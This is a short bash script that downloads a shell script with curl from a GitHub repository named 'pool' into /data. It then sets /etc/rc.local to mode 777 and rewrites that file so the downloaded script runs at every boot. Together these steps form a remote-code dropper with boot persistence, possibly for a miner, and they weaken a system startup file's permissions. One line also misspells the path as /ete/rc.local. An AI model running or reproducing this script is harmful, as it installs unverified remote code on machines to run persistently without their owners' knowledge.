#!/bin/bash
sleep 10
mkdir /data
cd /data
chmod 777 /etc/rc.local
curl -LO https://github.com/2319763378/pool/raw/master/change/script.sh
chmod 777 /data/script.sh
echo '#!/bin/bash' > /etc/rc.local
echo 'bash /data/script.sh' >> /etc/rc.local
cat /data/script.sh
echo "------------------------"
cat /ete/rc.local
echo "------------------------"
